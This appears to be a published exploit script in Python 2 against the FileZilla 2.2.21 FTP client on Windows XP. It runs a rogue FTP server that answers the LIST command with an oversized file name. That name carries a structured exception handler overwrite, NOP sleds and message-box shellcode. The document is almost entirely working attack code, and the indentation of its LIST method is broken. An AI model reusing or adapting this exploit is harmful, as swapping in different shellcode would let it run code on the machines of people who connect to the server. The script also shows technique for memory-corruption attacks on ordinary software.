# Date: 02/08/2015
# Exploit Author: ly0n
# Vendor Homepage: filezilla-project.org/
# Software Link: http://www.oldapps.com/filezilla.php?app=7cdf14e88e9dfa85fb661c1c6e649e90
# Version: tested on filezilla 2.2.21
# Tested on: Windows XP sp3 english
 
 
#!/usr/bin/env python2
# coding: utf-8
import os,socket,threading,time
#import traceback
 
# visit: ly0n.me
# greetz: NBS
 
#MSGBOX "BrokenByte" 
msgbox = ("\x68\x6e\x33\x72\x00\x68\x75\x74"
"\x69\x30\x68\x5e\x58\x65\x63\x89"
"\xe3\x68\x20\x20\x20\x00\x68\x68"
"\x65\x72\x65\x68\x77\x61\x73\x20"
"\x68\x6e\x33\x72\x20\x68\x75\x74"
"\x69\x30\x68\x5e\x58\x65\x63\x89"
"\xe1\x31\xc0\x50\x53\x51\x50\x50"
"\xbe\xea\x07\x45\x7e\xff\xe6\x31"
"\xc0\x50\xb8\x12\xcb\x81\x7c\xff"
"\xe0")
 
nops = "\x90" * 100
#77EA9CAC    POP POP RET kernel32.dll <- seh
#EB069090    SHORT JUMP 6 POS + 2 NOPS  <- nseh
nseh = "\xeb\x06\x90\x90"
seh = "\xAC\x9C\xEA\x77"
 
allow_delete = False
local_ip = "192.168.11.6" #SERVER LOCAL IP
local_port = 21 #DESIRED PORT
 
buffer1 = "\x41" * 1896 + nseh  + seh + nops + msgbox + nops
buffer = buffer1 + ".txt"
currdir=os.path.abspath(&#039;.&#039;)
  
class FTPserverThread(threading.Thread):
    def __init__(self,(conn,addr)):
        self.conn=conn
        self.addr=addr
        self.basewd=currdir
        self.cwd=self.basewd
        self.rest=False
        self.pasv_mode=False
        threading.Thread.__init__(self)
  
    def run(self):
        self.conn.send(&#039;220 Welcome!\r\n&#039;)
        while True:
            cmd=self.conn.recv(256)
            if not cmd: break
            else:
                print &#039;Recieved:&#039;,cmd
                try:
                    func=getattr(self,cmd[:4].strip().upper())
                    func(cmd)
                except Exception,e:
                    print &#039;ERROR:&#039;,e
                    #traceback.print_exc()
                    self.conn.send(&#039;500 Sorry.\r\n&#039;)
  
    def SYST(self,cmd):
        self.conn.send(&#039;215 UNIX Type: L8\r\n&#039;)
    def OPTS(self,cmd):
        if cmd[5:-2].upper()==&#039;UTF8 ON&#039;:
            self.conn.send(&#039;200 OK.\r\n&#039;)
        else:
            self.conn.send(&#039;451 Sorry.\r\n&#039;)
    def USER(self,cmd):
        self.conn.send(&#039;331 OK.\r\n&#039;)
    def PASS(self,cmd):
        self.conn.send(&#039;230 OK.\r\n&#039;)
        #self.conn.send(&#039;530 Incorrect.\r\n&#039;)
    def QUIT(self,cmd):
        self.conn.send(&#039;221 Goodbye.\r\n&#039;)
    def NOOP(self,cmd):
        self.conn.send(&#039;200 OK.\r\n&#039;)
    def TYPE(self,cmd):
        self.mode=cmd[5]
        self.conn.send(&#039;200 Binary mode.\r\n&#039;)
  
    def CDUP(self,cmd):
        if not os.path.samefile(self.cwd,self.basewd):
            #learn from stackoverflow
            self.cwd=os.path.abspath(os.path.join(self.cwd,&#039;..&#039;))
        self.conn.send(&#039;200 OK.\r\n&#039;)
    def PWD(self,cmd):
        cwd=os.path.relpath(self.cwd,self.basewd)
        if cwd==&#039;.&#039;:
            cwd=&#039;/&#039;
        else:
            cwd=&#039;/&#039;+cwd
        self.conn.send(&#039;257 \"%s\"\r\n&#039; % cwd)
    def CWD(self,cmd):
        chwd=cmd[4:-2]
        if chwd==&#039;/&#039;:
            self.cwd=self.basewd
        elif chwd[0]==&#039;/&#039;:
            self.cwd=os.path.join(self.basewd,chwd[1:])
        else:
            self.cwd=os.path.join(self.cwd,chwd)
        self.conn.send(&#039;250 OK.\r\n&#039;)
  
    def PORT(self,cmd):
        if self.pasv_mode:
            self.servsock.close()
            self.pasv_mode = False
        l=cmd[5:].split(&#039;,&#039;)
        self.dataAddr=&#039;.&#039;.join(l[:4])
        self.dataPort=(int(l[4])<<8)+int(l[5])
        self.conn.send(&#039;200 Get port.\r\n&#039;)
  
    def PASV(self,cmd): # from http://goo.gl/3if2U
        self.pasv_mode = True
        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.servsock.bind((local_ip,0))
        self.servsock.listen(1)
        ip, port = self.servsock.getsockname()
        print &#039;open&#039;, ip, port
        self.conn.send(&#039;227 Entering Passive Mode (%s,%u,%u).\r\n&#039; %
                (&#039;,&#039;.join(ip.split(&#039;.&#039;)), port>>8&0xFF, port&0xFF))
  
    def start_datasock(self):
        if self.pasv_mode:
            self.datasock, addr = self.servsock.accept()
            print &#039;connect:&#039;, addr
        else:
            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.datasock.connect((self.dataAddr,self.dataPort))
  
    def stop_datasock(self):
        self.datasock.close()
        if self.pasv_mode:
            self.servsock.close()
  
  
    def LIST(self,cmd):
        self.conn.send(&#039;150 Here comes the directory listing.\r\n&#039;)
        print &#039;list:&#039;, self.cwd
        self.start_datasock()
    dirlist = "drwxrwxrwx    1 100      0           11111 Jun 11 21:10" +buffer1+"\r\n\n"
    dirlist += "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22  "+buffer+" \r\n\n"
    self.datasock.send("total 2\r\n"+dirlist)
        self.stop_datasock()
        self.conn.send(&#039;226 Directory send OK.\r\n&#039;)
  
    def toListItem(self,fn):
        st=os.stat(fn)
        fullmode=&#039;rwxrwxrwx&#039;
        mode=&#039;&#039;
        for i in range(9):
            mode+=((st.st_mode>>(8-i))&1) and fullmode[i] or &#039;-&#039;
        d=(os.path.isdir(fn)) and &#039;d&#039; or &#039;-&#039;
        ftime=time.strftime(&#039; %b %d %H:%M &#039;, time.gmtime(st.st_mtime))
        return d+mode+&#039; 1 user group &#039;+str(st.st_size)+ftime+os.path.basename(fn)
  
    def MKD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        os.mkdir(dn)
        self.conn.send(&#039;257 Directory created.\r\n&#039;)
  
    def RMD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        if allow_delete:
            os.rmdir(dn)
            self.conn.send(&#039;250 Directory deleted.\r\n&#039;)
        else:
            self.conn.send(&#039;450 Not allowed.\r\n&#039;)
  
    def DELE(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        if allow_delete:
            os.remove(fn)
            self.conn.send(&#039;250 File deleted.\r\n&#039;)
        else:
            self.conn.send(&#039;450 Not allowed.\r\n&#039;)
  
    def RNFR(self,cmd):
        self.rnfn=os.path.join(self.cwd,cmd[5:-2])
        self.conn.send(&#039;350 Ready.\r\n&#039;)
  
    def RNTO(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        os.rename(self.rnfn,fn)
        self.conn.send(&#039;250 File renamed.\r\n&#039;)
  
    def REST(self,cmd):
        self.pos=int(cmd[5:-2])
        self.rest=True
        self.conn.send(&#039;250 File position reseted.\r\n&#039;)
  
    def RETR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        #fn=os.path.join(self.cwd,cmd[5:-2]).lstrip(&#039;/&#039;)
        print &#039;Downlowding:&#039;,fn
        if self.mode==&#039;I&#039;:
            fi=open(fn,&#039;rb&#039;)
        else:
            fi=open(fn,&#039;r&#039;)
        self.conn.send(&#039;150 Opening data connection.\r\n&#039;)
        if self.rest:
            fi.seek(self.pos)
            self.rest=False
        data= fi.read(1024)
        self.start_datasock()
        while data:
            self.datasock.send(data)
            data=fi.read(1024)
        fi.close()
        self.stop_datasock()
        self.conn.send(&#039;226 Transfer complete.\r\n&#039;)
  
    def STOR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        print &#039;Uplaoding:&#039;,fn
        if self.mode==&#039;I&#039;:
            fo=open(fn,&#039;wb&#039;)
        else:
            fo=open(fn,&#039;w&#039;)
        self.conn.send(&#039;150 Opening data connection.\r\n&#039;)
        self.start_datasock()
        while True:
            data=self.datasock.recv(1024)
            if not data: break
            fo.write(data)
        fo.close()
        self.stop_datasock()
        self.conn.send(&#039;226 Transfer complete.\r\n&#039;)
  
class FTPserver(threading.Thread):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((local_ip,local_port))
        threading.Thread.__init__(self)
  
    def run(self):
        self.sock.listen(5)
        while True:
            th=FTPserverThread(self.sock.accept())
            th.daemon=True
            th.start()
  
    def stop(self):
        self.sock.close()
  
if __name__==&#039;__main__&#039;:
    ftp=FTPserver()
    ftp.daemon=True
    ftp.start()
    print &#039;On&#039;, local_ip, &#039;:&#039;, local_port
    raw_input(&#039;Enter to end...\n&#039;)
    ftp.stop()

